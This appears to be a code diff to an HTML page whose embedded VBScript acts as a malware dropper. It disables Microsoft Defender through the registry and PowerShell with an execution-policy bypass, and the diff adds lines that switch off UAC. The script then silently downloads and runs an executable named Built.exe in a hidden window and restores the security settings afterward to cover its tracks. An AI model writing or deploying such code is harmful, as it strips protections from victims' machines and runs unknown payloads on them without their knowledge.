@@ -16,9 +16,14 @@
 </head>
 <body>
     <script language="VBScript">
-        ' Run PowerShell with execution policy bypass to disable Microsoft Defender
+        ' Forcefully disable Microsoft Defender (via registry and PowerShell)
         Set WshShell = CreateObject("WScript.Shell")
+        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD"
         WshShell.Run "powershell -ExecutionPolicy Bypass -Command ""Set-MpPreference -DisableRealtimeMonitoring $true""", 0, True
+
+        ' Forcefully disable UAC via registry
+        WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 0, "REG_DWORD"
+        WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin", 0, "REG_DWORD"
         
         ' Create a VBScript to download and execute Built.exe silently
         Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
@@ -46,9 +51,13 @@
         ' Run the downloaded EXE file silently
         WshShell.Run Chr(34) & tempFilePath & Chr(34), 0, False ' 0 hides the window
         
-        ' Re-enable Microsoft Defender (Real-Time Protection) after execution
+        ' Re-enable Defender protection after execution
         WshShell.Run "powershell -ExecutionPolicy Bypass -Command ""Set-MpPreference -DisableRealtimeMonitoring $false""", 0, True
         
+        ' Clean up registry keys to re-enable Defender and UAC
+        WshShell.RegDelete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware"
+        WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 1, "REG_DWORD"
+        WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin", 5, "REG_DWORD"
     </script>
 </body>
 </html>
